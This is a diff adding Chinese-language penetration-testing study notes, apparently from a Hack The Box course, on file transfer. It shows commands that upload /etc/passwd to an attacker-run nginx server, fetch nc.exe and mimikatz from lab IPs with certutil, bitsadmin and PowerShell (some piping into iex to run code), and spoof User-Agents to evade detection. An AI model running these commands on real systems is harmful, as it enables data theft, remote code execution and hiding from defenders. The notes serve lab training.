@@ -904,3 +904,133 @@ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/ho
 xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
 
+## 5.5 通过HTTP/S捕获文件
+
+为文件上传操作创建安全的web服务器
+
+### Nginx
+
+```shell-session
+mkdir -p /var/www/uploads/SecretUploadDirectory
+chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+```
+
+创建配置文件 /etc/nginx/sites-available/upload.conf：
+
+```shell-session
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+```
+
+```shell-session
+ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+systemctl restart nginx.service
+```
+
+错误日志/var/log/nginx/error.log，默认启用在80端口
+
+```
+rm /etc/nginx/sites-enabled/default
+```
+
+```
+curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+```
+
+## 5.6 二进制文件
+
+```
+certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+```
+
+```
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+
+```powershell-session
+bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
+
+## 5.7 检测技术
+
+1.Invoke-WebRequest
+
+```powershell-session
+Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
+Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
+
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
+
+```
+
+2. WinHttpRequest 
+
+```powershell-session
+$h=new-object -com WinHttp.WinHttpRequest.5.1;
+$h.open('GET','http://10.10.10.32/nc.exe',$false);
+$h.send();
+iex $h.ResponseText
+
+User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+
+```
+
+3.Msxml2
+
+```powershell-session
+$h=New-Object -ComObject Msxml2.XMLHTTP;
+$h.open('GET','http://10.10.10.32/nc.exe',$false);
+$h.send();
+iex $h.responseText
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
+
+```
+
+4.Certutil
+
+```cmd-session
+certutil -urlcache -split -f http://10.10.10.32/nc.exe 
+certutil -verifyctl -split -f http://10.10.10.32/nc.exe
+
+User-Agent: Microsoft-CryptoAPI/10.0
+
+```
+
+5.BITS
+
+```powershell-session
+Import-Module bitstransfer;
+Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
+$r=gc $env:temp\t;
+rm $env:temp\t; 
+iex $r
+
+User-Agent: Microsoft BITS/7.8
+
+```
+
+## 5.8 规避检测
+
+[Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) 包含一个 UserAgent 参数，该参数允许将默认用户代理更改为模拟 Internet Explorer、Firefox、Chrome、Opera 或 Safari 的用户代理。
+
+```
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
+
